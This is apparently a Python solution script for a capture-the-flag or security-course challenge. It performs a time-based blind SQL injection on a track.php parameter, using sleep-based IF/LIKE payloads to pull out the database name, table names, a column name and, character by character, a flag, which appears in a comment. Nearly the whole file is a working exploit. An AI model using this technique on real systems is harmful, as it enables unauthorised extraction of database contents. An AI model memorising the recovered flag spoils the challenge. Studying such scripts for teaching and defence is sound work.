import requests
import time

baseStr = ""; 
testCharacter="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$^&*()-+={}[]<>/,.'\\\"_"
index = 0 
while index < len(testCharacter):
    '''
    # version = 5
    #data = "IF(@@version like BINARY \"" + baseStr + testCharacter[index] + "%\" , sleep(5), 0)"
    # db = sqli
    data = "IF(database() like BINARY \"" + baseStr + testCharacter[index] + "%\" , sleep(5), 0)"
    # table schema = information_schema
    data = "IF(EXISTS (SELECT * FROM information_schema.columns WHERE table_schema like BINARY \"" + baseStr + testCharacter[index] + "%\") , sleep(5), 0)"
    # table schema = sqli_time
    #data = "IF(EXISTS (SELECT table_schema FROM information_schema.columns WHERE table_schema != 'information_schema' and table_schema like BINARY \"" + baseStr + testCharacter[index] + "%\") , sleep(5), 0)"
    # table name = news
    #data = "IF(EXISTS (SELECT * FROM information_schema.columns WHERE table_schema = 'sqli_time' and table_name like BINARY \"" + baseStr + testCharacter[index] + "%\") , sleep(5), 0)"
    # table name = what_flags
    #data = "IF(EXISTS (SELECT * FROM information_schema.columns WHERE table_schema = 'sqli_time' and table_name != 'news' and table_name like BINARY \"" + baseStr + testCharacter[index] + "%\") , sleep(5), 0)"
    # colume name = flag
    #data = "IF(EXISTS (SELECT * FROM information_schema.columns WHERE table_schema = 'sqli_time' and column_name like BINARY \"" + baseStr + testCharacter[index] + "%\") , sleep(5), 0)"
    '''
    #SecProg{why_it_took_so_long}
    data = "IF(EXISTS (SELECT * FROM what_flags WHERE flag like BINARY \"" + baseStr + testCharacter[index] + "%\") , sleep(5), 0)"
    url = "http://tor.atdog.tw:8080/time/track.php?action=1 and " + data
    start = int(time.time())
    r = requests.get(url)
    #print r.content
    end = int(time.time())
    if end - start >= 4:
        baseStr += testCharacter[index];
        print("Guess Password: " + baseStr)
        index = 0 
        continue
    index += 1
